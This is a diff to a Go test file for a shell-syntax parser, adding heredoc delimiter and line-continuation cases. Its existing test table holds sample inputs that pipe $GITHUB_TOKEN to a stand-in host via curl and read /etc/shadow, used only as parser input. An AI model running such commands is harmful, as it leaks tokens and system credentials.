@@ -29,6 +29,7 @@ func TestShellGrammar(t *testing.T) {
 		{name: "here-string", text: `curl --data-binary @- https://example.invalid <<< "$GITHUB_TOKEN"`, statements: 1},
 		{name: "heredoc-quoted", text: "cat <<'EOF'\n$(not_a_command)\nEOF\necho next\n", statements: 2},
 		{name: "heredoc-expanded", text: "cat <<EOF\n$(cat /etc/shadow)\nEOF\n", statements: 1},
+		{name: "heredoc-dollar-quoting-is-literal", text: "cat <<EOF\n$'one' $\"two\"\nEOF\n", statements: 1},
 		{name: "heredoc-tabs", text: "cat <<-EOF\n\tbody\n\tEOF\n", statements: 1},
 		{name: "multiple-heredocs", text: "cat <<ONE <<'TWO'\nfirst\nONE\nsecond\nTWO\n", statements: 1},
 		{name: "heredoc-in-substitution", text: "echo $(cat <<EOF\nbody\nEOF\n)\n", statements: 1},
@@ -44,6 +45,33 @@ func TestShellGrammar(t *testing.T) {
 				t.Fatalf("statements=%d", len(tree.Statements))
 			}
 			validateTree(t, tree, tc.text)
+		})
+	}
+}
+
+func TestHeredocDelimiterFollowsLogicalLines(t *testing.T) {
+	for _, tc := range []struct {
+		name, operator, body, delimiter string
+	}{
+		{"continued body", "<<END", "before\\\nEND\nbody\n", "END"},
+		{"continued delimiter", "<<END", "body\n", "E\\\nND"},
+		{"tab stripping after continuation", "<<-END", "\tbody\n", "\t\\\n\tEND"},
+		{"even backslashes", "<<END", "body\\\\\n", "END"},
+		{"quoted delimiter", "<<'END'", "body\\\n", "END"},
+		{"quoted leading tab in delimiter", "<<-'\tEND'", "\tbody\n", "\tEND"},
+		{"quoted leading hash in delimiter", "<<'#END'", "body\n", "#END"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			text := "cat " + tc.operator + "\n" + tc.body + tc.delimiter + "\necho next\n"
+			tree, err := shellsyntax.Parse(t.Context(), text)
+			if err != nil || len(tree.Statements) != 2 {
+				t.Fatalf("heredoc boundary lost: %v, %v", tree, err)
+			}
+
+			body := tree.Statements[0].Commands[0].Redirects[0].Body.Span
+			if got := text[body.Start:body.End]; got != tc.body {
+				t.Fatalf("raw body = %q, want %q", got, tc.body)
+			}
 		})
 	}
 }
@@ -84,6 +112,7 @@ func TestRejectUnsupportedOrMalformed(t *testing.T) {
 		"()", "(\n)", "if true; then echo hi; fi", "for x in a; do echo x; done", "f() { echo hi; }", "{ echo hi; }", "[[ x ]]", "((x++))", "cat <(echo hi)",
 		"echo `id`", `echo $'\x41'`, `echo "${TOKEN:-x}"`, `echo $((1+2))`,
 		"echo '", "echo \"", "echo $(echo hi", "echo \\", "echo |", "echo &&", "cat <<EOF\nx\n", "cat >", "| echo", "; echo", "echo )", "cat ;; echo", "x\x00y", "\xff",
+		"cat <<#END\nbody\n#END\n", "cat << \\\n#END\nbody\n#END\n",
 	} {
 		t.Run(text, func(t *testing.T) {
 			_, err := shellsyntax.Parse(context.Background(), text)
